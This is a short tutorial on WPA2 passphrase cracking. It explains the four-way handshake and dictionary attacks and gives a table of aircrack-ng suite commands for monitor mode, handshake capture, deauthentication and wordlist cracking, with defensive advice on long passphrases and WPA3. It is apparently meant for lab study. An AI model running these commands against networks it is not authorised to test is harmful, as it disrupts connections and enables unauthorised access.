## Important concepts

### The handshake is the material

The four-way handshake proves both sides know the pre-shared key without transmitting it. An attacker can capture the exchange and test candidate passphrases offline by deriving the same keys.

### Dictionary attacks depend on the passphrase

Aircrack-ng tries each wordlist entry against the captured handshake. If the passphrase is long, random and absent from the list, the attack fails. This is why a unique passphrase of sufficient length is an effective defence.

## Practical notes

Use your own access point with a weak test passphrase. Replace interface, channel and BSSID values.

| Command | What it does |
| --- | --- |
| `sudo airmon-ng start wlan0` | Put the adapter into monitor mode. |
| `sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa wlan0mon` | Capture traffic from the target channel. |
| `sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon` | Send deauthentication frames in the lab to force a reconnect. |
| `sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa-01.cap` | Run the offline wordlist attack against the captured handshake. |

Commands are shown for study. Run them only in your own lab, read the manual page (`man <tool>`) first, and check every option before executing anything.

## FAQ

### Can WPA2 be cracked without a handshake?

A dictionary attack needs a handshake or PMKID to test candidates. Without that material there is nothing to verify guesses against.

### Does a long password make WPA2 safe?

A long, random, unique passphrase makes offline guessing impractical, which is the main practical defence. WPA3 improves the protocol further.
